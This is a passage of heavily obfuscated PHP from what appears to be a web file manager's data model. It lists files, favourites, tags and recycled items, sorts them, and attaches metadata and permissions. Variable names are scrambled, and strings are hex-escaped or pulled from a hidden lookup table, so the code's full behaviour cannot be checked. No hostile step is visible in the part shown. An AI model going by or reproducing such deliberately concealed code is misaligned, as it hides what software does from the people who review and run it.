$this->filterWhere($ÉËëŞ¼¿); } if (!$Í»éöË‰) { return !0; } $†Ëæ­¡ = $this->cacheKey($áá¸êöÔ[429]); CacheLock::lock($†Ëæ­¡); $ó•€è¶’ = $this->addAll($Í»éöË‰, array(), !0); CacheLock::unlock($†Ëæ­¡); return $ó•€è¶’; } protected function optionDefault($á°İÁ´ = '') { return !1; } public function setDeep($¾Î»’ê , $¦½âİ‡Ê = false, $ÈßÅîí¦ = '') { $ñ»ø” = explode($_SERVER[¹ş¤¶ĞÖ][10], $¾Î»’ê ); $ïî•»õØ = $this->get(); array_set_value($ïî•»õØ, $¾Î»’ê , $¦½âİ‡Ê); $this->set($ñ»ø”[0], $ïî•»õØ[$ñ»ø”[0]], $ÈßÅîí¦); } public function remove($ÖÀÉğ®¤, $Ù‘Òè›Ö = '') { $ËÓüñÔ¸ =& $_SERVER[¹ş¤¶ĞÖ]; $this->cacheRemove($Ù‘Òè›Ö); $Â‡ŒÄƒå = $this->filterWhere(array($ËÓüñÔ¸[94] => $ÖÀÉğ®¤, $ËÓüñÔ¸[33] => $Ù‘Òè›Ö)); if (is_null($ÖÀÉğ®¤)) { unset($Â‡ŒÄƒå[$ËÓüñÔ¸[94]]); } return $this->where($Â‡ŒÄƒå)->delete(); } public function cacheSet($ÀÜ¶Ÿóò, $ÄÙíœÑß = false) { return Cache::set($this->cacheKey($ÀÜ¶Ÿóò), $ÄÙíœÑß); } public function cacheGet($ÆîØâ‰ø) { return Cache::get($this->cacheKey($ÆîØâ‰ø)); } public function cacheRemove($û¹›»¼Ä) { return Cache::remove($this->cacheKey($û¹›»¼Ä)); } protected function filterWhere($Ò¦¦¾İÇ) { return $Ò¦¦¾İÇ; } protected function cacheKey($°ã‹ÔÕé) { return $°ã‹ÔÕé; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\155\x65" => "\x69\157\137\163\157\165\x72\143\145\137\x6d\145\x74\x61", "\155\145\x74\141\x46\x69\x65\154\x64" => "\x73\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\155\145", "\164\x69\x6d\x65", "\151\156\x73\x65\x72\164", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\x63\x72\x65\x61\164\x65\124\151\155\x65", "\164\151\x6d\145", "\151\156\x73\x65\x72\x74", "\x66\x75\156\x63\x74\151\157\156"), array("\166\151\x65\x77\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\x66\x75\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($…‚×‡·) { return $this->listSource(array($_SERVER[¹ş¤¶ĞÖ][430] => $…‚×‡·)); } public function typeName($íìÍ¾º¨) { static $º›Š¦› = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $º›Š¦›[$íìÍ¾º¨ . $_SERVER[¹ş¤¶ĞÖ][12]]; } public function sourceListInfo($ÖƒÄõŸ, $æ«İõÙ = false) { $ûáÚåå =& $_SERVER[¹ş¤¶ĞÖ]; $ÖƒÄõŸ = $ÖƒÄõŸ ? $ÖƒÄõŸ : array(); $ÖƒÄõŸ = array_filter(array_unique($ÖƒÄõŸ)); if (!$ÖƒÄõŸ) { return array(); } $î–Ô¥‘¯ = $this->where(array($ûáÚåå[431] => array($ûáÚåå[7], $ÖƒÄõŸ)))->select(); $this->_listDataApply($î–Ô¥‘¯, $æ«İõÙ); return array_to_keyvalue($î–Ô¥‘¯, $ûáÚåå[431]); } public function pathInfoFilter(&$µÂ¸ø‚Ï) { $°×¡Œ­ =& $_SERVER[¹ş¤¶ĞÖ]; static $íùè…‘ = false; static $—–¼‘Ü  = false; static $×Ş»Ş…Ã = false; if (!$íùè…‘) { $îà²Ö´ı = $°×¡Œ­[432]; $îà²Ö´ı .= $°×¡Œ­[433]; $îà²Ö´ı .= $°×¡Œ­[434]; $¿ÂÁÔ = $°×¡Œ­[435]; $Û˜¶üÑ¹ = explode($°×¡Œ­[50], $¿ÂÁÔ); $íùè…‘ = explode($°×¡Œ­[50], $îà²Ö´ı); $—–¼‘Ü  = array(); foreach ($íùè…‘ as $‡®¹œäË) { if (in_array($‡®¹œäË, $Û˜¶üÑ¹)) { continue; } $—–¼‘Ü [] = $‡®¹œäË; } $×Ş»Ş…Ã = explode($°×¡Œ­[50], $°×¡Œ­[436]); } foreach ($×Ş»Ş…Ã as $Ì×šéš) { if (isset($µÂ¸ø‚Ï[$Ì×šéš])) { $µÂ¸ø‚Ï[$Ì×šéš] = intval($µÂ¸ø‚Ï[$Ì×šéš]); } } $µÂ¸ø‚Ï[$°×¡Œ­[84]] = $°×¡Œ­[437] . $µÂ¸ø‚Ï[$°×¡Œ­[431]] . $°×¡Œ­[438]; $µÂ¸ø‚Ï[$°×¡Œ­[33]] = $µÂ¸ø‚Ï[$°×¡Œ­[439]] == 1 ? $°×¡Œ­[75] : $°×¡Œ­[200]; $µÂ¸ø‚Ï[$°×¡Œ­[440]] = $this->typeName($µÂ¸ø‚Ï[$°×¡Œ­[440]]); if ($µÂ¸ø‚Ï[$°×¡Œ­[439]] != 1) { $µÂ¸ø‚Ï[$°×¡Œ­[174]] = $µÂ¸ø‚Ï[$°×¡Œ­[441]]; unset($µÂ¸ø‚Ï[$°×¡Œ­[441]]); } $§ğÍ‹š = $íùè…‘; if (isset($µÂ¸ø‚Ï[$°×¡Œ­[442]]) && $µÂ¸ø‚Ï[$°×¡Œ­[442]][$°×¡Œ­[443]] == -1) { $§ğÍ‹š = $—–¼‘Ü ; } $µÂ¸ø‚Ï = array_field_key($µÂ¸ø‚Ï, $§ğÍ‹š); return $µÂ¸ø‚Ï; } public function listUserFav() { $“­ş“¤‘ =& $_SERVER[¹ş¤¶ĞÖ]; $ÇÍêİçœ = Model($“­ş“¤‘[444])->listData(); $…Œ©ÃÖ¹ = array_filter_by_field($ÇÍêİçœ, $“­ş“¤‘[33], $“­ş“¤‘[445]); $…Œ©ÃÖ¹ = array_to_keyvalue($…Œ©ÃÖ¹, $“­ş“¤‘[12], $“­ş“¤‘[84]); if ($…Œ©ÃÖ¹) { $ºÊúÏÆ = $this->listSource(array($“­ş“¤‘[446] => array($“­ş“¤‘[447], $…Œ©ÃÖ¹))); } $ºÊúÏÆ = array_to_keyvalue($ºÊúÏÆ[$“­ş“¤‘[398]], $“­ş“¤‘[431]); foreach ($ÇÍêİçœ as &$“§¿ı§õ) { $“§¿ı§õ = array($“­ş“¤‘[448] => $“§¿ı§õ[$“­ş“¤‘[428]], $“­ş“¤‘[449] => $“§¿ı§õ[$“­ş“¤‘[32]], $“­ş“¤‘[450] => $“§¿ı§õ[$“­ş“¤‘[84]], $“­ş“¤‘[451] => $“§¿ı§õ[$“­ş“¤‘[33]], $“­ş“¤‘[452] => $“§¿ı§õ[$“­ş“¤‘[201]], $“­ş“¤‘[453] => $“§¿ı§õ[$“­ş“¤‘[85]]); if ($“§¿ı§õ[$“­ş“¤‘[33]] == $“­ş“¤‘[445] && $ºÊúÏÆ[$“§¿ı§õ[$“­ş“¤‘[84]]]) { $“§¿ı§õ[$“­ş“¤‘[87]] = $ºÊúÏÆ[$“§¿ı§õ[$“­ş“¤‘[84]]]; } } unset($“§¿ı§õ); return $ÇÍêİçœ; } public function listUserTag($ç­«»±) { $Ôªõ”«Ù =& $_SERVER[¹ş¤¶ĞÖ]; if ($ç­«»± && !is_array($ç­«»±)) { $ç­«»± = array($ç­«»±); } $˜—ÜÏÎ = Model($Ôªõ”«Ù[454])->listData(); $ºÌ¼õŒ = array(); $ïÂì×„® = array(); foreach ($˜—ÜÏÎ as $‰Ã³ù¿‰) { $åÎİÄ¯ = $‰Ã³ù¿‰[$Ôªõ”«Ù[84]]; if (!$åÎİÄ¯) { continue; } if (!isset($ïÂì×„®[$åÎİÄ¯])) { $ïÂì×„®[$åÎİÄ¯] = array(); } $ïÂì×„®[$åÎİÄ¯][] = $‰Ã³ù¿‰[$Ôªõ”«Ù[455]]; $ºÌ¼õŒ[$‰Ã³ù¿‰[$Ôªõ”«Ù[84]]] = $‰Ã³ù¿‰; } $Î»¿Ù¯¡ = array(); $Ş»¢‚Í‡ = array(); $ÀêÕêóµ = array(); foreach ($ïÂì×„® as $¦ĞÖ Îù => $½Å¼Õ¶) { $²æ‘›« = !0; if (!$ç­«»±) { $Î»¿Ù¯¡[] = $¦ĞÖ Îù; continue; } foreach ($ç­«»± as $ï‚³™åı) { if (!in_array($ï‚³™åı, $½Å¼Õ¶)) { $²æ‘›« = !1; break; } } if (!$²æ‘›«) { continue; } if (!is_numeric($¦ĞÖ Îù)) { $¸›·’ = $ºÌ¼õŒ[$¦ĞÖ Îù]; $áª¾àôø = array($Ôªõ”«Ù[32] => $¸›·’[$Ôªõ”«Ù[32]], $Ôªõ”«Ù[84] => $¸›·’[$Ôªõ”«Ù[84]], $Ôªõ”«Ù[33] => $¸›·’[$Ôªõ”«Ù[33]], $Ôªõ”«Ù[87] => array($Ôªõ”«Ù[456] => 1), $Ôªõ”«Ù[202] => !0); if ($¸›·’[$Ôªõ”«Ù[33]] == $Ôªõ”«Ù[200]) { $ÀêÕêóµ[] = $áª¾àôø; } if ($¸›·’[$Ôªõ”«Ù[33]] == $Ôªõ”«Ù[75]) { $Ş»¢‚Í‡[] = $áª¾àôø; } continue; } $Î»¿Ù¯¡[] = $¦ĞÖ Îù; } if ($Î»¿Ù¯¡) { $¿Å•¥³ = $this->listSource(array($Ôªõ”«Ù[446] => array($Ôªõ”«Ù[447], $Î»¿Ù¯¡))); } $¿Å•¥³ = $¿Å•¥³ ? $¿Å•¥³ : array($Ôªõ”«Ù[82] => array(), $Ôªõ”«Ù[83] => array()); $¿Å•¥³[$Ôªõ”«Ù[82]] = array_merge($¿Å•¥³[$Ôªõ”«Ù[82]], $Ş»¢‚Í‡); $¿Å•¥³[$Ôªõ”«Ù[83]] = array_merge($¿Å•¥³[$Ôªõ”«Ù[83]], $ÀêÕêóµ); if (isset($¿Å•¥³[$Ôªõ”«Ù[395]]) && count($Î»¿Ù¯¡) == $¿Å•¥³[$Ôªõ”«Ù[395]][$Ôªõ”«Ù[396]]) { return $¿Å•¥³; } $àÅ¤°Ü© = array(); $ÀÑŒ·¤Ö = array_to_keyvalue($¿Å•¥³[$Ôªõ”«Ù[82]], $Ôªõ”«Ù[12], $Ôªõ”«Ù[431]); $—Øê˜äò = array_to_keyvalue($¿Å•¥³[$Ôªõ”«Ù[83]], $Ôªõ”«Ù[12], $Ôªõ”«Ù[431]); $ÍøèÉ = array_merge($—Øê˜äò, $ÀÑŒ·¤Ö); foreach ($Î»¿Ù¯¡ as $åÎİÄ¯) { if (!in_array($åÎİÄ¯, $ÍøèÉ)) { $àÅ¤°Ü©[] = $åÎİÄ¯; } } if ($àÅ¤°Ü©) { Model($Ôªõ”«Ù[457])->removeBySource($àÅ¤°Ü©); } return $¿Å•¥³; } public function listUserRecycle() { $ŒâŞë´¼ =& $_SERVER[¹ş¤¶ĞÖ]; $óœÅ¡†° = Model($ŒâŞë´¼[458])->listData(); if (!$óœÅ¡†°) { return array(); } $éÇİÃ‰Š = array($ŒâŞë´¼[446] => array($ŒâŞë´¼[447], $óœÅ¡†°), $ŒâŞë´¼[459] => 1); return $this->listSource($éÇİÃ‰Š); } public function listSource($¿¥ñ²ã, $åÀ´ÈÓÃ = 3000, $ù‰„âšè = false) { $ç‹ÉŒ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($¿¥ñ²ã[$ç‹ÉŒ[460]])) { $¿¥ñ²ã[$ç‹ÉŒ[460]] = 0; } if (isset($¿¥ñ²ã[$ç‹ÉŒ[461]]) && $¿¥ñ²ã[$ç‹ÉŒ[461]] == $ç‹ÉŒ[198]) { $¿¥ñ²ã[$ç‹ÉŒ[441]] = array($ç‹ÉŒ[360], $ç‹ÉŒ[462]); } $ªûñ¹ã  = $ç‹ÉŒ[463]; $êŸ¼ßèŞ = $this->field($ªûñ¹ã )->_makeOrder()->where($¿¥ñ²ã)->selectPage($åÀ´ÈÓÃ); $this->_listPageCheck($êŸ¼ßèŞ, $ªûñ¹ã , $¿¥ñ²ã); $this->_listDataApply($êŸ¼ßèŞ[$ç‹ÉŒ[398]], $ù‰„âšè); $this->_listMake($êŸ¼ßèŞ); return $êŸ¼ßèŞ; } private function _listPageCheck(&$†ôÁ€¼‘, $Âµ…¼ì¢, $±ô±ËÛ°) { $‰ıÇ =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_array($†ôÁ€¼‘[$‰ıÇ[395]])) { return; } $Ş˜ä©¾¤ = $†ôÁ€¼‘[$‰ıÇ[395]]; if ($Ş˜ä©¾¤[$‰ıÇ[397]] <= 1) { return; } if ($Ş˜ä©¾¤[$‰ıÇ[396]] >= 100000) { return; } if (Model($‰ıÇ[464])->get($‰ıÇ[465]) != $‰ıÇ[466]) { return; } $Âµ…¼ì¢ = str_replace(array($‰ıÇ[53], $‰ıÇ[371], $‰ıÇ[231]), $‰ıÇ[12], $Âµ…¼ì¢); $Âµ…¼ì¢ = $‰ıÇ[467] . str_replace($‰ıÇ[50], $‰ıÇ[468], $Âµ…¼ì¢) . $‰ıÇ[469]; $óŠú«™˜ = $‰ıÇ[470]; $óŠú«™˜ = $óŠú«™˜ . $‰ıÇ[471]; $‰ÂÓˆ¼¤ = $Ş˜ä©¾¤[$‰ıÇ[392]] * ($Ş˜ä©¾¤[$‰ıÇ[382]] - 1) . $‰ıÇ[50] . $Ş˜ä©¾¤[$‰ıÇ[392]]; $‡»à«¡  = $this->_makeOrder(!0); $äãà´¼— = $‰ıÇ[467] . str_replace($‰ıÇ[50], $‰ıÇ[468], $‡»à«¡ [0]); if (strpos($äãà´¼—, $‰ıÇ[472])) { $äãà´¼— = str_replace($‰ıÇ[472], $‰ıÇ[473], $äãà´¼—); } else { $äãà´¼— .= $‰ıÇ[474] . $‡»à«¡ [1]; } $ñ„Í‚îŸ = array(); foreach ($±ô±ËÛ° as $“ïáƒÒ  => $©¿É®¢½) { $ñ„Í‚îŸ[$‰ıÇ[467] . $“ïáƒÒ ] = $©¿É®¢½; } $this->alias($‰ıÇ[475])->field($Âµ…¼ì¢)->limit($‰ÂÓˆ¼¤)->order($äãà´¼—); $öñÏ“å = $this->join($óŠú«™˜)->where($ñ„Í‚îŸ)->select(); if ($öñÏ“å) { $†ôÁ€¼‘[$‰ıÇ[398]] = $öñÏ“å; } } protected function _makeOrder($“¢˜…Ú = false) { $“ì¬÷Â” =& $_SERVER[¹ş¤¶ĞÖ]; $¥‰Ó§ = Model($“ì¬÷Â”[476])->get($“ì¬÷Â”[477]); $›ÊÉñş² = Model($“ì¬÷Â”[476])->get($“ì¬÷Â”[478]); $ƒ¨®æÊ« = array($“ì¬÷Â”[479] => $“ì¬÷Â”[480], $“ì¬÷Â”[481] => $“ì¬÷Â”[482]); $ƒ€¿â = array($“ì¬÷Â”[32] => $“ì¬÷Â”[32], $“ì¬÷Â”[76] => $“ì¬÷Â”[76], $“ì¬÷Â”[174] => $“ì¬÷Â”[441], $“ì¬÷Â”[483] => $“ì¬÷Â”[483], $“ì¬÷Â”[484] => $“ì¬÷Â”[485], $“ì¬÷Â”[201] => $“ì¬÷Â”[201], $“ì¬÷Â”[85] => $“ì¬÷Â”[85]); $¬Üğ–†¨ = Input::get($“ì¬÷Â”[486], $“ì¬÷Â”[7], $¥‰Ó§, array_keys($ƒ€¿â)); $ò‡ğÜÙ„ = Input::get($“ì¬÷Â”[487], $“ì¬÷Â”[7], $›ÊÉñş², array_keys($ƒ¨®æÊ«)); if (!in_array($¬Üğ–†¨, array_keys($ƒ€¿â))) { $¬Üğ–†¨ = $“ì¬÷Â”[32]; } if (!in_array($ò‡ğÜÙ„, array_keys($ƒ¨®æÊ«))) { $¬Üğ–†¨ = $“ì¬÷Â”[479]; } if ($¬Üğ–†¨ == $“ì¬÷Â”[32]) { } $Õƒ•Ãš“ = $“ì¬÷Â”[488] . $ƒ€¿â[$¬Üğ–†¨] . $“ì¬÷Â”[53] . $ƒ¨®æÊ«[$ò‡ğÜÙ„]; $Õƒ•Ãš“ = rtrim(trim($Õƒ•Ãš“), $“ì¬÷Â”[50]); if ($“¢˜…Ú) { return array($Õƒ•Ãš“, $ƒ¨®æÊ«[$ò‡ğÜÙ„]); } return $this->order($Õƒ•Ãš“); } protected function _listDataApplyItem($ºÏğÆ, $Êõ¤ß¥¥ = false) { $‰—æØ‘ = array($ºÏğÆ); $this->_listDataApply($‰—æØ‘, $Êõ¤ß¥¥); return $‰—æØ‘[0]; } protected function _listDataApply(&$¢É®£´, $œ¿…Š¼‹ = false) { $¸Ãû–ëÁ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¢É®£´) { $¢É®£´ = array(); return; } $İÓ¿ş©„ = array_to_keyvalue($¢É®£´, $¸Ãû–ëÁ[12], $¸Ãû–ëÁ[431]); $İÓ¿ş©„ = array_unique($İÓ¿ş©„); $this->_listSourceCache($¢É®£´); if (!$œ¿…Š¼‹) { $this->_listAppendMeta($¢É®£´, $İÓ¿ş©„); $this->_listAppendFileMeta($¢É®£´, $İÓ¿ş©„); $this->_listAppendChildren($¢É®£´, $İÓ¿ş©„); } $this->_listAppendPath($¢É®£´); $this->_listAppendAuth($¢É®£´); $this->_listAppendSourceInfo($¢É®£´, $İÓ¿ş©„); $this->_listAppendUser($¢É®£´); $this->_listFilterInfo($¢É®£´, $œ¿…Š¼‹); $this->_listAppendAuthSecret($¢É®£´); } protected function _listSourceCache($îŞşİÔ) { $æÍ‚ ‰ =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($îŞşİÔ as $õ²äôşß) { self::$cacheSourceInfo[$æÍ‚ ‰[489] . $õ²äôşß[$æÍ‚ ‰[431]]] = $õ²äôşß; } } protected function _listFilterInfo(&$‚¥¯ùÊş, $ãåŠæŸ‘ = false) { $ıµÁ§¼Â =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($‚¥¯ùÊş as &$Ø¾øõ‘®) { $Ø¾øõ‘® = $this->pathInfoFilter($Ø¾øõ‘®); self::$cachePathInfo[$ıµÁ§¼Â[490] . intval($ãåŠæŸ‘) . $ıµÁ§¼Â[415] . $Ø¾øõ‘®[$ıµÁ§¼Â[431]]] = $Ø¾øõ‘®; } unset($Ø¾øõ‘®); } protected function _listMake(&$Ùä½³ıİ) { $«èÚè³ =& $_SERVER[¹ş¤¶ĞÖ]; $Ùä½³ıİ[$«èÚè³[82]] = array(); $Ùä½³ıİ[$«èÚè³[83]] = array(); foreach ($Ùä½³ıİ[$«èÚè³[398]] as $Ğ¸É£±) { $œıÜß÷Ë = $Ğ¸É£±[$«èÚè³[439]] == 1 ? $«èÚè³[82] : $«èÚè³[83]; $Ùä½³ıİ[$œıÜß÷Ë][] = $Ğ¸É£±; } unset($Ùä½³ıİ[$«èÚè³[398]]); } protected function _listAppendMeta(&$õÏ†Â› , $óØÚ‰Ã±) { $™¼ ¡íÆ =& $_SERVER[¹ş¤¶ĞÖ]; $ö­è‰´³ = array($™¼ ¡íÆ[446] => array($™¼ ¡íÆ[447], $óØÚ‰Ã±)); $ğâæ·§µ = Model($™¼ ¡íÆ[491])->field($™¼ ¡íÆ[492])->where($ö­è‰´³)->select(); if (!$ğâæ·§µ) { return; } $İ¦šËÔ„ = array($™¼ ¡íÆ[493], $™¼ ¡íÆ[494], $™¼ ¡íÆ[473]); $¥¸†£…Ú = array(); foreach ($ğâæ·§µ as $°ÉØ¤ğ) { if (!isset($¥¸†£…Ú[$°ÉØ¤ğ[$™¼ ¡íÆ[431]]])) { $¥¸†£…Ú[$°ÉØ¤ğ[$™¼ ¡íÆ[431]]] = array(); } if (in_array($°ÉØ¤ğ[$™¼ ¡íÆ[94]], $İ¦šËÔ„)) { continue; } $¥¸†£…Ú[$°ÉØ¤ğ[$™¼ ¡íÆ[431]]][$°ÉØ¤ğ[$™¼ ¡íÆ[94]]] = $°ÉØ¤ğ[$™¼ ¡íÆ[403]]; } foreach ($õÏ†Â›  as &$õ”“ÓÃ¼) { $õ”“ÓÃ¼[$™¼ ¡íÆ[495]] = !1; if (isset($¥¸†£…Ú[$õ”“ÓÃ¼[$™¼ ¡íÆ[431]]])) { $õ”“ÓÃ¼[$™¼ ¡íÆ[495]] = $¥¸†£…Ú[$õ”“ÓÃ¼[$™¼ ¡íÆ[431]]]; } if ($this->fileIsLock($õ”“ÓÃ¼) && $õ”“ÓÃ¼[$™¼ ¡íÆ[442]]) { $ÑÖ’Ÿö° = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $õ”“ÓÃ¼[$™¼ ¡íÆ[442]][$™¼ ¡íÆ[443]] = AuthModel::authDisable($õ”“ÓÃ¼[$™¼ ¡íÆ[442]][$™¼ ¡íÆ[443]], $ÑÖ’Ÿö°); $õ”“ÓÃ¼[$™¼ ¡íÆ[442]][$™¼ ¡íÆ[496]][$™¼ ¡íÆ[442]] = $õ”“ÓÃ¼[$™¼ ¡íÆ[442]][$™¼ ¡íÆ[443]]; } } unset($õ”“ÓÃ¼); } protected function _listAppendFileMeta(&$½¢åÎİˆ, $·Ğ¹¬×š) { $‚ğĞäõ =& $_SERVER[¹ş¤¶ĞÖ]; $Ãôˆ·ÔÄ = array_to_keyvalue($½¢åÎİˆ, $‚ğĞäõ[12], $‚ğĞäõ[497]); $Ãôˆ·ÔÄ = array_filter(array_unique($Ãôˆ·ÔÄ)); if (!$Ãôˆ·ÔÄ) { return; } $şÙñØÁ¥ = array($‚ğĞäõ[498] => array($‚ğĞäõ[447], $Ãôˆ·ÔÄ)); $‰èÄ…‹ = $‚ğĞäõ[499]; $€üÃ¥Ş• = Model($‚ğĞäõ[500])->field($‰èÄ…‹)->where($şÙñØÁ¥)->select(); $€üÃ¥Ş• = array_to_keyvalue($€üÃ¥Ş•, $‚ğĞäõ[497]); $Õ«¿“‡Ç = Model($‚ğĞäõ[501])->field($‚ğĞäõ[502])->where($şÙñØÁ¥)->select(); $Õ«¿“‡Ç = $Õ«¿“‡Ç ? $Õ«¿“‡Ç : array(); $‡¯ç“Î = array(); foreach ($Õ«¿“‡Ç as $ÂÊö·²) { if (!isset($‡¯ç“Î[$ÂÊö·²[$‚ğĞäõ[497]]])) { $‡¯ç“Î[$ÂÊö·²[$‚ğĞäõ[497]]] = array(); } $‡¯ç“Î[$ÂÊö·²[$‚ğĞäõ[497]]][$ÂÊö·²[$‚ğĞäõ[94]]] = $ÂÊö·²[$‚ğĞäõ[403]]; } foreach ($½¢åÎİˆ as &$’ïåÙÖÓ) { $Ä‡ú› é = $’ïåÙÖÓ[$‚ğĞäõ[497]]; if (!$Ä‡ú› é || !is_array($€üÃ¥Ş•[$Ä‡ú› é])) { continue; } $²Ü¿Éøí = $€üÃ¥Ş•[$Ä‡ú› é]; $²Ü¿Éøí[$‚ğĞäõ[76]] = $’ïåÙÖÓ[$‚ğĞäõ[76]]; $²Ü¿Éøí[$‚ğĞäõ[32]] = $’ïåÙÖÓ[$‚ğĞäõ[32]]; if (!isset(self::$cacheFileInfo[$‚ğĞäõ[503] . $Ä‡ú› é])) { self::$cacheFileInfo[$‚ğĞäõ[503] . $Ä‡ú› é] = array_merge(array(), $²Ü¿Éøí); } unset($€üÃ¥Ş•[$Ä‡ú› é][$‚ğĞäõ[84]]); $Ş«¨“¿ = is_array($‡¯ç“Î[$Ä‡ú› é]) ? $‡¯ç“Î[$Ä‡ú› é] : array(); $’ïåÙÖÓ[$‚ğĞäõ[170]] = array_merge($Ş«¨“¿, $€üÃ¥Ş•[$Ä‡ú› é]); if (isset($’ïåÙÖÓ[$‚ğĞäõ[170]][$‚ğĞäõ[169]])) { $’ïåÙÖÓ[$‚ğĞäõ[169]] = json_decode($’ïåÙÖÓ[$‚ğĞäõ[170]][$‚ğĞäõ[169]], !0); unset($’ïåÙÖÓ[$‚ğĞäõ[170]][$‚ğĞäõ[169]]); } } unset($’ïåÙÖÓ); } protected function _listAppendSourceInfo(&$ŒÀ´ßÊÃ, $¶¬²¶üœ) { $·­Ñßš² =& $_SERVER[¹ş¤¶ĞÖ]; $Èú´½ˆ” = Model($·­Ñßš²[504])->listData(); $ö’ª³ß‡ = Model($·­Ñßš²[454])->listData(); $ƒò£ŒêÍ = Model($·­Ñßš²[444])->listData(); $¶ÃÆ£Ö = Model($·­Ñßš²[505])->listSimple(); $‘ïú—Ò = array_to_keyvalue($Èú´½ˆ”, $·­Ñßš²[428]); $´‰·€úÊ = array_to_keyvalue_group($ö’ª³ß‡, $·­Ñßš²[84], $·­Ñßš²[455]); $²£Šâ¸ı = array_to_keyvalue($ƒò£ŒêÍ, $·­Ñßš²[84]); $öÏ½çÇé = array_to_keyvalue_group($¶ÃÆ£Ö, $·­Ñßš²[431]); foreach ($ŒÀ´ßÊÃ as &$´ûˆÕÚ) { $´ûˆÕÚ[$·­Ñßš²[87]] = array($·­Ñßš²[506] => 0, $·­Ñßš²[507] => 0, $·­Ñßš²[508] => 0); if (isset($²£Šâ¸ı[$´ûˆÕÚ[$·­Ñßš²[431]]])) { $´ûˆÕÚ[$·­Ñßš²[87]][$·­Ñßš²[509]] = 1; $´ûˆÕÚ[$·­Ñßš²[87]][$·­Ñßš²[510]] = $²£Šâ¸ı[$´ûˆÕÚ[$·­Ñßš²[431]]][$·­Ñßš²[32]]; } if ($´‰·€úÊ && $‘ïú—Ò && isset($´‰·€úÊ[$´ûˆÕÚ[$·­Ñßš²[431]]])) { $´ûˆÕÚ[$·­Ñßš²[87]][$·­Ñßš²[511]] = array(); foreach ($´‰·€úÊ[$´ûˆÕÚ[$·­Ñßš²[431]]] as $±“–îÙò) { $ÉàÖãÑ = $‘ïú—Ò[$±“–îÙò]; $´ûˆÕÚ[$·­Ñßš²[87]][$·­Ñßš²[511]][] = array($·­Ñßš²[512] => $ÉàÖãÑ[$·­Ñßš²[428]], $·­Ñßš²[449] => $ÉàÖãÑ[$·­Ñßš²[32]], $·­Ñßš²[513] => $ÉàÖãÑ[$·­Ñßš²[514]]); } } if ($öÏ½çÇé && isset($öÏ½çÇé[$´ûˆÕÚ[$·­Ñßš²[431]]])) { $´ûˆÕÚ[$·­Ñßš²[87]][$·­Ñßš²[515]] = array(); foreach ($öÏ½çÇé[$´ûˆÕÚ[$·­Ñßš²[431]]] as $€ÈÎÆ‹Ö) { $ëöø›ô = $·­Ñßš²[516]; if ($€ÈÎÆ‹Ö[$·­Ñßš²[517]] == $·­Ñßš²[88]) { $ëöø›ô .= $·­Ñßš²[518]; } $´ûˆÕÚ[$·­Ñßš²[87]][$·­Ñßš²[515]] = array_field_key($€ÈÎÆ‹Ö, explode($·­Ñßš²[50], $ëöø›ô)); } } } unset($´ûˆÕÚ); return $ŒÀ´ßÊÃ; } protected function _listAppendChildren(&$Ü˜¹•Ï, $Ûø—·ä§) { $´¾‡¼ÌŒ =& $_SERVER[¹ş¤¶ĞÖ]; $”ÒòŞùÚ = array(); $áÇÎ¹¸ = array($´¾‡¼ÌŒ[207] => 0, $´¾‡¼ÌŒ[208] => 0); foreach ($Ü˜¹•Ï as &$Ò”Ó‡Ì¡) { if (!$Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[439]]) { continue; } $”ÒòŞùÚ[] = $Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[431]]; } unset($Ò”Ó‡Ì¡); if (!$”ÒòŞùÚ) { return; } $‘Œ¥—¯¦ = array($´¾‡¼ÌŒ[461] => array($´¾‡¼ÌŒ[7], $”ÒòŞùÚ), $´¾‡¼ÌŒ[460] => 0); $ŒÎ«¬Šú = array($´¾‡¼ÌŒ[461], $´¾‡¼ÌŒ[439], $´¾‡¼ÌŒ[519] => $´¾‡¼ÌŒ[520]); $‹ş‚¥« = $this->field($ŒÎ«¬Šú)->where($‘Œ¥—¯¦)->group($´¾‡¼ÌŒ[521])->select(); $‚”Ø·ó‚ = array(); foreach ($‹ş‚¥« as $´ª„ìµ ) { $Ì¾„æèÀ = $´ª„ìµ [$´¾‡¼ÌŒ[461]]; $·˜âØĞÍ = $´ª„ìµ [$´¾‡¼ÌŒ[439]] == $´¾‡¼ÌŒ[88] ? $´¾‡¼ÌŒ[208] : $´¾‡¼ÌŒ[207]; if (!isset($‚”Ø·ó‚[$Ì¾„æèÀ])) { $‚”Ø·ó‚[$Ì¾„æèÀ] = array($´¾‡¼ÌŒ[207] => 0, $´¾‡¼ÌŒ[208] => 0); } $‚”Ø·ó‚[$Ì¾„æèÀ][$·˜âØĞÍ] += $´ª„ìµ [$´¾‡¼ÌŒ[520]]; } foreach ($Ü˜¹•Ï as &$Ò”Ó‡Ì¡) { if (!$Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[439]]) { continue; } $Ğ¿ÀÎ¼‘ = is_array($‚”Ø·ó‚[$Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[431]]]) ? $‚”Ø·ó‚[$Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[431]]] : $áÇÎ¹¸; $Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[208]] = $Ğ¿ÀÎ¼‘[$´¾‡¼ÌŒ[208]]; $Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[207]] = $Ğ¿ÀÎ¼‘[$´¾‡¼ÌŒ[207]]; unset($Ò”Ó‡Ì¡[$´¾‡¼ÌŒ[441]]); } unset($Ò”Ó‡Ì¡); 